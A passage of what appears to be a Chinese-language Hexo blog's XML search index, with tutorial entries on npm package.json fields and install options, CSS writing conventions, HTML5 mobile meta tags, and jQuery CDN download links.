&#x68;&#116;&#x74;&#112;&#115;&#x3a;&#x2f;&#x2f;&#x75;&#115;&#x65;&#x72;&#64;&#x68;&#111;&#115;&#116;&#x6e;&#x61;&#x6d;&#101;&#x2f;&#112;&#114;&#111;&#x6a;&#x65;&#99;&#116;&#x2e;&#x67;&#105;&#x74;&#35;&#99;&#111;&#109;&#109;&#x69;&#116;&#45;&#105;&#x73;&#x68;git+&#x68;&#x74;&#116;&#x70;&#115;&#58;&#47;&#x2f;&#x75;&#115;&#101;&#x72;&#64;&#x68;&#111;&#x73;&#116;&#110;&#97;&#x6d;&#101;&#x2f;&#x70;&#x72;&#x6f;&#106;&#101;&#x63;&#x74;&#47;&#98;&#108;&#97;&#104;&#x2e;&#103;&#x69;&#116;&#x23;&#x63;&#x6f;&#109;&#109;&#105;&#x74;&#45;&#105;&#115;&#104;git+&#x68;&#x74;&#116;&#x70;&#115;&#58;&#47;&#47;&#117;&#x73;&#x65;&#114;&#x40;&#104;&#x6f;&#x73;&#x74;&#110;&#97;&#x6d;&#101;&#x2f;&#112;&#x72;&#x6f;&#106;&#x65;&#x63;&#x74;&#47;&#98;&#108;&#97;&#104;&#46;&#x67;&#x69;&#x74;&#35;&#99;&#111;&#109;&#x6d;&#x69;&#116;&#x2d;&#105;&#x73;&#x68;commit-ish 是可以被 git checkout 的任何 tag、sha 或者 branch。默认为 master。GitHub URLs1.1.65 版后,你可以仅仅用 “user/foo-project” 引用 GitHub urls,比如：{ &quot;name&quot;: &quot;foo&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;dependencies&quot;: { &quot;express&quot;: &quot;visionmedia/express&quot; } } devDependencies如果有人要使用你的模块,那么他们可能不需要你开发使用的外部测试或者文档框架。在这种情况下,最好将这些附属的项目列在 devDependencies 中。这些东西会在执行 npm link 或者 npm install 的时候初始化,并可以像其他 npm 配置参数一样管理。详见 npm-config。对于非特定平台的构建步骤,比如需要编译CoffeeScript,可以用 prepublish 脚本去实现,并把它依赖的包放在 devDependency 中。（注：prepublish 定义了在执行 npm publish 的时候先行执行的脚本）比如：{ &quot;name&quot;: &quot;ethopia-waza&quot;, &quot;description&quot;: &quot;a delightfully fruity coffee varietal&quot;, &quot;version&quot;: &quot;1.2.3&quot;, &quot;devDependencies&quot;: { &quot;coffee-script&quot;: &quot;~1.6.3&quot; }, &quot;scripts&quot;: { &quot;prepublish&quot;: &quot;coffee -o lib/ -c src/waza.coffee&quot; }, &quot;main&quot;: &quot;lib/waza.js&quot; } prepublish 脚本会在 publishing 前运行,这样用户就不用自己去 require 来编译就能使用。并且在开发模式中（比如本地运行 npm install）会运行这个脚本以便更好地测试。peerDependencies在一些场景中,如在一个 host 中不必须进行 require 时候,你想表现你的 package 与一个 host 工具或者库的兼容关键。这一般用来引用插件。尤其是你的模块可能要暴露一个特定的接口,并由 host 文档来预期和指定。比如：{ &quot;name&quot;: &quot;tea-latte&quot;, &quot;version&quot;: &quot;1.3.5&quot; &quot;peerDependencies&quot;: { &quot;tea&quot;: &quot;2.x&quot; } } 这能保证你的 package 可以只和 tea 的 2.x 版本一起初始化。npm install tea-latte 可能会产生下面的依赖关系â”œâ”€â”€ tea-latte@1.3.5 â””â”€â”€ tea@2.2.0 试图初始化另一个有会冲突的依赖的插件将导致一个错误。因此,确保你的插件的需求约束越弱越好,而不要去把它锁定到一个特定的版本。假设这个 host 遵守 semver 规范,只改变这个 package 的主版本会打破你的插件。因此,如果你在 package 中用过每个 1.x 版本,就用 &quot;^1.0&quot; 或者 “1.x&quot; 来表示。如果你依赖于功能介绍 1.5.2,用 &quot;&gt;= 1.5.2 &lt; 2&quot;。bundledDependencies一组包名,他们会在发布的时候被打包进去。拼成 &quot;bundleDependencies&quot;（缺 d）也可以： optionalDependencies。如果一个依赖可用,但你希望在它安装错误的时候 npm 也能继续初始化,那么你可以把它放在 optionalDependencies hash 中。这是一个包名到版本或者 url 的 map,就像 dependencies hash 一样。只是它运行错误。处理缺乏依赖也是你的程序的责任。比如像这样：try { var foo = require(&quot;foo&quot;); var fooVersion = require(&quot;foo/package.json&quot;).version; } catch (er) { foo = null; } if (notGoodFooVersion(fooVersion)) { foo = null; } // .. then later in your program .. if (foo) { foo.doFooThings(); } optionalDependencies 会覆盖 dependencies 中同名的项,所以通常比只放在一个地方好。engines你可以指定工作的 node 的版本：{ &quot;engines&quot;: { &quot;node&quot;: &quot;&gt;=0.10.3 &lt;0.12&quot; } } 像 dependensies 一样,如果你不指定版本或者指定 &quot;*&quot; 作为版本,那么所有版本的 node 都可以。如果指定一个 &quot;engines&quot; 字段,那么 npm 会需要 node 在里面,如果 &quot;engines&quot; 被省略,npm 会假定它在 node 上工作。你也可以用 &quot;engines&quot; 字段来指定哪一个 npm 版本能更好地初始化你的程序,如：{ &quot;engines&quot;: { &quot;npm&quot;: &quot;~1.0.20&quot; } } 记住,除非用户设置 engine-strict 标记,这个字段只是建议值。engineStrict如果你确定你的模块一定不会运行在你指定版本之外的 node 或者 npm 上,你可以在 package.json 文件中设置 &quot;engineStrict&quot;:true。它会重写用户的 engine-strict 设置。除非你非常非常确定,否则不要这样做。如果你的 engines hash过度地限制,很可能轻易让自己陷入窘境。慎重地考虑这个选择。如果大家滥用它,它会再以后的 npm 版本中被删除。os你可以指定你的模块要运行在哪些操作系统中：{ &quot;os&quot;: [&quot;darwin&quot;, &quot;linux&quot;] } 你也可以用黑名单代替白名单,在名字前面加上”!”就可以了：{ &quot;os&quot;: [&quot;!win32&quot;] } 操作系统用 process.platform 来探测。虽然没有很好地理由,但它是同时支持黑名单和白名单的。cpu如果你的代码只能运行在特定的 cpu 架构下,你可以指定一个：{ &quot;cpu&quot;: [&quot;x64&quot;, &quot;ia32&quot;] } 就像 os 选项,你也可以黑一个架构：{ &quot;cpu&quot;: [&quot;!arm&quot;, &quot;!mips&quot;] } cpu 架构用 process.arch 探测。preferGlobal如果包主要是需要全局安装的命令行程序,就设置它为 true 来提供一个 warning 给只在局部安装的人。它不会真正的防止用户在局部安装,但如果它没有按预期工作它会帮助防止产生误会。private如果你设置 &quot;private&quot;: true,npm 就不会发布它。这是一个防止意外发布私有库的方式。如果你要确定给定的包是只发布在特定 registry（如内部 registry）的,用 publishConfighash 的描述来重写 registry 的 publish-time 配置参数。publishConfig这是一个在 publish-time 使用的配置集合。当你想设置 tag 或者 registry 的时候它非常有用,所以你可以确定一个给定的包没有打上 &quot;lastest&quot; 的 tag 或者被默认发布到全局的公开 registry。任何配置都可以被重写,但当然可能只有 &quot;tag&quot; 和 &quot;registry&quot; 与发布的意图有关。参见 npm-config 有可以被重写的列表。SEE ALSOsemvernpm-initnpm-versionnpm-confignpm-confignpm-helpnpm-faqnpm-installnpm-publishnpm-rm]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈 Node.js 中的 npm]]></title>
    <url>%2Farchives%2F4bdc3688.html</url>
    <content type="text"><![CDATA[主要介绍 npm 中的各个选项的作用以及其区别。npm 依赖于 Node.js,童鞋们要注意你的系统是否有 Node.js 环境npm 是什么NPM 的全称是 Node Package Manager,是随同 Node.js 一起安装的包管理和分发工具,它很方便让 JavaScript 开发者下载、安装、上传以及管理已经安装的包。npm install 安装模块安装包,默认会安装最新的版本,最后所有的依赖会存放在 node_modules 目录下的,如：$ npm install gulp 全局安装只需加上 -g 或者 --global 参数,就可以实现全局安装,如：$ npm install gulp -g 安装指定版本$ npm install gulp@3.9.1 -S, —save添加模块命令$ npm install [module-name] --save $ npm install [module-name] -S 作用自动把模块和版本号添加至 package.json 的 dependencies （生产阶段的依赖）部分,避免了手动添加。package.json 文件的 dependencies 字段：&quot;dependencies&quot;: { &quot;[module-name]&quot;: &quot;^[version]&quot; } -D, —save-dev添加模块命令$ npm install [module-name] --save-dev $ npm install [module-name] -D 作用自动把模块和版本号添加至 package.json 的 devDependencies（开发阶段的依赖）部分,避免了手动添加。package.json 文件的 devDependencies 字段：&quot;devDependencies&quot;: { &quot;[module-name]&quot;: &quot;^[version]&quot; } -O, —save-optional添加模块命令$ npm install [module-name] --save-optional $ npm install [module-name] -O 作用自动把模块和版本号添加至 package.json 的 optionalDependencies（可选阶段的依赖）部分,避免了手动添加。package.json 文件的 optionalDependencies 字段：&quot;optionalDependencies&quot;: { &quot;[module-name]&quot;: &quot;^[version]&quot; }, -E, —save-exact添加模块命令$ npm install [module-name] --save-exact $ npm install [module-name] -E 作用自动把模块和版本号添加至 package.json 的 dependencies（精确安装指定模块版本）部分,避免了手动添加。需要注意的是：package.json 文件的 dependencies 字段,版本号中的 ^ 消失了package.json 文件的 dependencies 字段&quot;dependencies&quot;: { &quot;[module-name]&quot;: &quot;[version]&quot; } npm 其他命令创建 package.json 文件安装包的信息可保持到项目的 package.json 文件中,以便后续的其它的项目开发或者他人合作使用,也说 package.json 在项目中是必不可少的。$ npm init 安装模块模块的依赖都被写入了 package.json 文件后,他人打开项目的根目录（项目开源、内部团队合作）,时,只需一条命令就可以安装 package.json 中的依赖。$ npm install 加上 --save 会安装 package.json 中 dependencies 里的所有模块。$ npm install --save 卸载模块想要卸载模块也很简单。$ npm uninstall [module-name] 以上写法并不会改变 package.json 文件,使用 -S | --save | -D | --save-dev | -O | --save-optional 选项即可删除 package.json 文件中的依赖。如使用 --save 选项,将会删除 package.json 文件 dependencies中的该模块名和版本号。$ npm uninstall [module-name] --save 更新模块从服务器下载最新版本的模块。需要注意的是,最新版本的模块并不是最稳定的,模块还是选择相对稳定的版本较好。支持 -g 选项。$ npm update [-g] [module-name] 检查模块是否已经过时此命令会列出所有已经过时的包,可以及时进行包的更新.$ npm outdated 启动模块npm start [-- &lt;args&gt;] 该命令写在 package.json 文件 scripts 的 start 字段中,可以自定义命令来配置一个服务器环境和安装一系列的必要程序,如:&quot;scripts&quot;: { &quot;start&quot;: &quot;gulp -s&quot; } 如果 package.json 文件没有设置 start,则将直接启动 node server.js停止模块npm stop [-- &lt;args&gt;] 重新启动模块npm restart [-- &lt;args&gt;] 更新模块可以安装全局插件npm install -g npm-check-updates 查看最新的版本npm-check-updates ncu # 为上一条指令的缩写 升级至最新版本ncu -a 在使用下载最新的安装包npm update 当然,如果所有包都是最新版本,执行 ncu 后会提示：All dependencies match the latest package versions :) 查看包的安装路径输出 node_modules 的路径,支持 -g 选项。$ npm root [-g] 管理 npm 的配置路径对于 config 这块用得最多应该是设置代理,解决 npm 安装一些模块失败的问题$ npm config set &lt;key&gt; &lt;value&gt; [-g|--global] $ npm config delete &lt;key&gt; $ npm config list 查看命令的帮助$ npm help &lt;command&gt; 区别--save-dev 是你开发时候依赖的东西；--save 是你发布之后还依赖的东西。--save-optional 是可选依赖,非必下；--save-exact 可以指定精确的版本号,也就是说当发布了新版本,系统不会系在最新版本的模块,只会下载该版本的模块。npm install 下载依赖时会安装 package.json 中 dependencies 和 devDependencies 里的所有模块。npm install --save 下载依赖时只会安装 package.json 中 dependencies 里的所有模块。比如,你写 ES6 代码,如果你想编译成 ES5 发布那么 babel 就是 devDependencies。如果你用了 jQuery,由于发布之后还是依赖 jQuery,所以是 dependencies。最常用的还是 npm 中的 --save 和 --save-dev 选项。 --save 和 --save-dev 选项。]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS 代码书写顺序以及代码规范]]></title>
    <url>%2Farchives%2F7c12557e.html</url>
    <content type="text"><![CDATA[一个优秀的前端开发人员, 在书写 CSS 时必定要注意的重点, 而不是随意的书写 CSS, 这样会给自己还有他人带来困扰CSS 文件的编码表明 CSS 文件的页面编码为 UTF-8。 在 CSS 文件的最前面添加如下代码For Example:@charset &quot;UTF-8&quot;; CSS 书写顺序位置属性 { position , top , right , z-index , display , float 等}大小 { width , height , padding , margin 等}文字系列 { font , line-height , letter-spacing , color , text-align 等}背景 { background , border 等}其他 { animation , transition 等}For Example:/* Low */ .example { color: red; z-index: -1; background-color: #9e0; display: inline-block; font-size: 1.5em; } /* Good */ .example { z-index: -1; display: inline-block; font-size: 1.5em; color: red; background-color: #9e0; } 利用插件实现自动排序使用过 Sublime text 的童鞋应该知道有一款插件 CSScomb 是用来自动排序 CSS 属性的, 这是一个不错的偷懒方式, 也是加快开发速度的技巧CSS 书写规范使用 CSS 缩写属性CSS 有些属性是可以缩写的, 比如 padding, margin, font 等等, 这样精简代码同时又能提高用户的阅读体验。For Example:/* Low */ .box { border-top-style: none; font-family: serif; font-size: 100%; line-height: 1.6; padding-bottom: 2em; padding-left: 1em; padding-right: 1em; padding-top: 0; } /* Good */ .box { border-top: 0; font: 100%/1.6 serif; padding: 0 1em 2em; } 去掉小数点前的 “0”若属性的值小于 1, 建议去掉小数点前的 “0”For Example:/* Low */ .box { font-size: 0.8em; } /* Good */ .box { font-size: 0.8em; } 值为 0 时, 去掉单位若属性的值等于 0 时, 建议去掉值后面跟着的单位For Example:/* Low */ * { margin: 0px; padding: 0px; } /* Good */ * { margin: 0; padding: 0; } 简写命名很多用户都喜欢简写类名, 但前提是要让人看懂你的命名才能简写哦For Example:/* Low */ .navigation { margin: 0 0 1em 2em; } .atr { color: #93c; } /* Good */ .nav { margin: 0 0 1em 2em; } .author { color: #93c; } 16 进制颜色代码可以缩写有些颜色代码是可以缩写的, 我们就尽量缩写吧, 提高用户体验为主, 简写规则： 同时满足 1、 2 相同, 3、 4 相同, 5、 6 相同For Example:/* Low */ .box { color: #eebbcc; } .font { color: #333333; } /* Good */ .box { color: #ebc; } .font { color: #333; } 选择器命名规范长名称或词组可以使用中横线来为选择器命名一律小写避免使用大写, 区分于 JS 的函数名强制建议使用英文, 不使用拼音不建议使用 _ 下划线来命名 CSS 选择器, 为什么呢？输入的时候少按一个 shift 键；浏览器兼容问题 （比如使用 _tips 的选择器命名, 在 IE6 是无效的）能良好区分 JavaScript 变量命名（ JS 变量命名是用 _ ）For Example:/* Low */ .maintitle { color: #e3c; } .main_title { color: #e3c; } /* Good */ .main-title { color: #e3c; } CSS 选择器最好不要随意使用 idid 在 JS 是唯一的, 不能多次使用, 而使用 class 类选择器却可以重复使用id 的优先级优先与 class , 所以 id 应该按需使用, 而不能滥用id 选择器多用于 JS 方法的调用For Example:/* Low */ #info-title { font-size: 3em; } /* Good */ .info-title { font-size: 3em; } 为选择器添加前缀有时候可以给选择器添加一个表示状态的前缀, 让语义更明了当你在开发属于自己的 CSS 代码时也可以为你的 CSS 代码添加前缀For Example:/* Low */ .whithdrawal { background-color: #ccc; } .divconent { width: 60rem; font-family: serif; color: #999; } .sapninline { display: inline-block; } /* Good */ .is-whithdrawal { background-color: #ccc; } .my-div-conent { width: 60rem; font-family: serif; color: #999; } .my-sapn-inline { display: inline-block; } 命名规范举例所有命名一律使用小写所有的命名一律使用英文, 不使用中文或者拼音用 - 代替 _ , 文件命名时尽量少用 -文件命名时尽量不使用缩写, 除非是一眼就可以看出来该文件是干什么用文件命名时, 如有该文件的版本号, 尽量要跟上, 如： jquery-2.1.4.min.js引用外部文件时, 尽量选择压缩版的文件, 这样可以加快网页的加载速度常用的 CSS / ID 命名header / footer =&gt; 头部 / 尾部content / container =&gt; 内容nav / subnav =&gt; 导航 / 子导航sidebar =&gt; 侧边栏row / column =&gt; 行 / 列top / left / bottom / right =&gt; 上 / 左 / 下 / 右logo =&gt; 标志banner =&gt; 广告main =&gt; 页面主体hot =&gt; 热点news =&gt; 新闻download =&gt; 下载menu / submenu =&gt; 菜单 / 子菜单search =&gt; 搜索friendlink =&gt; 友情链接copyright =&gt; 版权tags =&gt; 标签list =&gt; 列表loginbar =&gt; 登录条msg =&gt; 提示信息status =&gt; 状态常用 CSS / JS 文件命名master.css =&gt; 主要的modeule.css =&gt; 模块base.css =&gt; 基本共用base.min.css =&gt; 基本共用样式表压缩版layout.css =&gt; **布局、 版面themes.css =&gt; 主题font.css =&gt; 文字from.css =&gt; 表单jquery-ui-1.9.0.js =&gt; jQuery UI 的脚本, 版本为 1.9.0jquery.min.js =&gt; jQuery 压缩版base.js =&gt; 基本共用from-ajax.js =&gt; 通过 Ajax 技术提交的表单]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>Criterion</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5 移动端头部标签]]></title>
    <url>%2Farchives%2F1ae8a561.html</url>
    <content type="text"><![CDATA[记录 HTML5 通用的移动端和 PC 端头部标签,即 meta 标签定义文档类型和编码习惯&lt;!DOCTYPE html&gt; &lt;!-- 使用 HTML5 doctype,不区分大小写 --&gt; &lt;html lang=&quot;en&quot;&gt; &lt;!-- 更加标准的 lang 属性写法 //zhi.hu/XyIa --&gt; &lt;head&gt; &lt;!-- 声明文档使用的字符编码 --&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;body&gt; &lt;/html&gt; 兼容性&lt;!-- 优先使用 IE 最新版本和 Chrome 内核的浏览器--&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt; &lt;!-- 为移动设备添加 viewport --&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt; &lt;!-- 启用360浏览器的极速模式(webkit) --&gt; &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt; 搜索引擎优化&lt;!-- 页面描述 --&gt; &lt;meta name=&quot;description&quot; content=&quot;不超过150个字符&quot;&gt; &lt;!-- 页面关键词 --&gt; &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt; &lt;!-- 网页作者 --&gt; &lt;meta name=&quot;author&quot; content=&quot;name, email@gmail.com&quot;&gt; &lt;!-- 搜索引擎抓取 --&gt; &lt;!-- index：搜索引擎索引此网页;follow：搜索引擎继续通过此网页的链接索引搜索其它的网页。 --&gt; &lt;!-- 搜索引擎索引方式：通常有如下几种取值：none,noindex,nofollow,all,index和follow。--&gt; &lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;&gt; &lt;!-- all：文件将被检索,且页面上的链接可以被查询； none：文件将不被检索,且页面上的链接不可以被查询； index：文件将被检索； follow：页面上的链接可以被查询； noindex：文件将不被检索； nofollow：页面上的链接不可以被查询。 --&gt; 页面缓存设置&lt;!-- 清除缓存 --&gt; &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt; &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt; &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt; 移动端字体设置/** 中英字体名对照表 宋体 SimSun 黑体 SimHei 微信雅黑 Microsoft Yahei 微软正黑体 Microsoft JhengHei 新宋体 NSimSun 新细明体 MingLiU 细明体 MingLiU 标楷体 DFKai-SB 仿宋 FangSong 楷体 KaiTi 仿宋_GB2312 FangSong_GB2312 楷体_GB2312 KaiTi_GB2312 说明：中文字体多数使用宋雅黑,英文用 Helvetica */ body { font-family: Microsoft Yahei, SimSun, Helvetica; } 电话号码和邮箱的识别&lt;!-- 一般只启用电话号码的识别 --&gt; &lt;meta name=&quot;format-detection&quot; content=&quot;telphone=yes&quot;&gt; &lt;!-- 忽略页面中的数字识别为电话,忽略email识别 --&gt; &lt;meta name=&quot;format-detection&quot; content=&quot;telphone=no, email=no&quot;&gt; &lt;!-- 启用页面中的数字识别为电话,启用email识别 --&gt; &lt;meta name=&quot;format-detection&quot; content=&quot;telphone=yes, email=yes&quot;&gt; 响应式&lt;!-- IOS 中 Safari 允许全屏浏览 --&gt; &lt;meta name=”apple-mobile-web-app-capable” content=”yes”&gt; &lt;!-- IOS 隐藏状态栏 --&gt; &lt;meta name=”apple-mobile-web-app-status-bar-style” content=black”&gt; &lt;!-- 添加到主屏后的标题（IOS 6 新增） --&gt; &lt;meta name=&quot;apple-mobile-web-app-title&quot; content=&quot;标题&quot;&gt; &lt;!-- uc 强制竖屏 --&gt; &lt;meta name=&quot;screen-orientation&quot; content=&quot;portrait&quot;&gt; &lt;!-- QQ 强制竖屏 --&gt; &lt;meta name=&quot;x5-orientation&quot; content=&quot;portrait&quot;&gt; &lt;!-- UC 强制全屏 --&gt; &lt;meta name=&quot;full-screen&quot; content=&quot;yes&quot;&gt; &lt;!-- QQ 强制全屏 --&gt; &lt;meta name=&quot;x5-fullscreen&quot; content=&quot;true&quot;&gt; &lt;!-- UC 应用模式 --&gt; &lt;meta name=&quot;browsermode&quot; content=&quot;application&quot;&gt; &lt;!-- QQ 应用模式 --&gt; &lt;meta name=&quot;x5-page-mode&quot; content=&quot;app&quot;&gt; &lt;!-- 可隐藏地址栏,仅针对 IOS 的 Safari（注：IOS7.0 版本以后,safari上已看不到效果） --&gt; &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt; &lt;!-- 仅针对 IOS 的 Safari 顶端状态条的样式（可选 default/black/black-translucent ） --&gt; &lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot; /&gt; &lt;!-- IOS 中禁用将数字识别为电话号码/忽略 Android 平台中对邮箱地址的识别 --&gt; &lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no, email=no&quot; /&gt; favicon icon 图标&lt;!-- 添加 favicon icon --&gt; &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/ico&quot; href=&quot;/favicon.icon&quot;&gt; &lt;!-- iOS 图标 begin --&gt; &lt;!-- iPhone 和 iTouch,默认 57x57 像素,必须有 --&gt; &lt;link rel=&quot;apple-touch-icon-precomposed&quot; href=&quot;/apple-touch-icon-57x57-precomposed.png&quot;&gt; &lt;!-- Retina iPhone 和 Retina iTouch,114x114 像素,可以没有,但推荐有 --&gt; &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;114x114&quot; href=&quot;/apple-touch-icon-114x114-precomposed.png&quot;&gt; &lt;!-- Retina iPad,144x144 像素,可以没有,但推荐有 --&gt; &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;144x144&quot; href=&quot;/apple-touch-icon-144x144-precomposed.png&quot;&gt; &lt;!-- iOS 图标 end --&gt; 参考模板&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt; &lt;meta name=”apple-mobile-web-app-capable” content=”yes”&gt; &lt;meta name=”apple-mobile-web-app-status-bar-style” content=black”&gt; &lt;meta name=&quot;format-detection&quot; content=&quot;telphone=no, email=no&quot;&gt; &lt;title&gt;标题&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; herf=&quot;&quot;&gt; &lt;/head&gt; &lt;body&gt; ... &lt;/body&gt; &lt;/html&gt;]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
        <tag>Moblie</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery 各个版本的下载链接]]></title>
    <url>%2Farchives%2Ff087f5b5.html</url>
    <content type="text"><![CDATA[提供 jQuery 所有版本的下载链接和 CDN 链接部分下载链接来至 \&lt;//code.jquery.com/&gt;jquery-3.2.1（最新）&lt;script src=&quot;////code.jquery.com/jquery-3.2.1.min.js&quot;&gt;&lt;/script&gt; jquery-3.2.0官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-3.2.0.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-3.2.1.zipjquery-3.0.0官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-3.0.0.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-3.0.0.zipjquery-2.2.4jquery-2.2.4 (推荐目前最稳定的,不会出现延时打不开情况)官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-2.2.4.min.js&quot;&gt;&lt;/script&gt; jquery-2.1.4jquery-2.1.4 (注！ jquery-2.0 以上版本不再支持 IE 6/7/8)百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-2.1.4.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-2.1.4.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-2.1.4.zipjquery-2.1.1百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-2.1.1.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-2.1.1.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-2.1.1.zipjquery-2.0.0百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/2.0.0/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-2.0.0.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-2.0.0.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-2.0.3.zipjquery-2.0.0.zipjquery-1.11.3百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.11.3/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.11.3.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.11.3.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.11.3.zipjquery-1.11.1百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.11.1/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.11.1.zipjquery-1.10.2百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.10.2.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.10.2.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.10.2.zipjquery-1.9.1百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.9.1/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.9.1.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.9.1.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.9.1.zipjquery-1.8.3百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.8.3.zipjquery-1.7.2百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.7.2/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.7.2.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.7.2.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.7.2.zipjquery-1.6.4百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.6.4/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.6.4.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.6.4.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.6.4.zipjquery-1.5.2百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.5.2/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.5.2.min.js&quot;&gt;&lt;/script&gt; 官网 jquery 压缩版引用地址&lt;script src=&quot;//code.jquery.com/jquery-1.5.2.min.js&quot;&gt;&lt;/script&gt; 下载链接jquery-1.5.2.zipjquery-1.4.4百度压缩版引用地址&lt;script src=&quot;//libs.baidu.com/jquery/1.4.4/jquery.min.js&quot;&gt;&lt;/script&gt; 微软压缩版引用地址&lt;script src=&quot;//ajax.aspnetcdn.com/ajax/jquery/jquery-1.4.4.min.js&quot;&gt;&lt;/script&gt; 官网 